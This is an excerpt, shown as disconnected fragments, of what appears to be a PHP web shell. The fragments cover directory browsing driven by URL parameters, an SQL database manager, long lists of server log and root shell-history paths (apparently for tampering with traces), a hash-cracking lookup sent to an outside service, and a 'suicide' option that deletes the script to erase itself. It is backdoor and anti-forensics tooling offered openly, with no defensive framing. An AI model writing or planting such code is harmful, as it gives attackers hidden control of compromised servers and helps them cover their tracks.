...
if (isset($_GET['go'])){ $dir = $_GET['dir']; $dir = @realpath($dir); chdir($dir); }
...
case 'sh': $ctype='application/octet-stream'; break;
...
if (isset($_GET['sql'])){
checksession();
if (isset($_SESSION['connected'])){header("Location: ?dbmanager");}
page("SQL", "auto");
...
if (!isset($_SESSION['connected'])){header("Location: ?sql");}
...
'/var/log/httpd/error_log', '/var/log/httpd/domains/',
'/var/log/messages', 'C:\windows\system32\LogFiles\W3SVC1',
'C:\WINDOWS\system32\LogFiles', '/var/log/httpd-error.log',
'/var/log/lighttpd/*', '/var/log/httpd-error.log', 
);
$ftp_logs = array('/var/log/proftpd/access.log', '/var/log/proftpd/auth.log','/var/log/messages', '/var/log/vsftpd.log','/var/log/pureftpd.log');
$system_logs = array(
'/var/log/auth.log', '/var/log/telnetd',
'/var/log/messages', '/var/log/lastlog',
'/var/log/auth.log.1', '/var/log/auth.log.2',
'/var/log/utmp', '/var/log/wtmp',
'/var/log/secure', '/var/log/mysqld.log',
'C:\WINDOWS\system32\LogFiles', '/var/log/mail',
"/home/$user/.bash_history", "/home/$user/.mysql_history",
'/root/.bash_history', '/root/.ksh_history',
'/root/.mysql_history', '/root/.ksh_history',
"/home/$user/.bash_logout", '/root/.bash_logout',
'/var/log/faillog', '/root/.ksh_history',
'/etc/wtmp', '/root/.ksh_history',
);
...
if (!$result_md5[1][0] == ""){ $hashdecrypted = $result_md5[1][0];} else {$hashdecrypted = "No Results";}
} elseif ($_POST['option'] == "SHA1"){
$input = $_POST['input'];
$parameters = 'string='.urlencode($input).'&submit='.urlencode("Decrypt");
$ch = @curl_init();
...
if (isset($_GET['suicide'])){ checksession(); if(!@unlink(__FILE__)){page("Error", "auto"); echo $errormsg[11]; echo"</div></body></html>";}}
?>
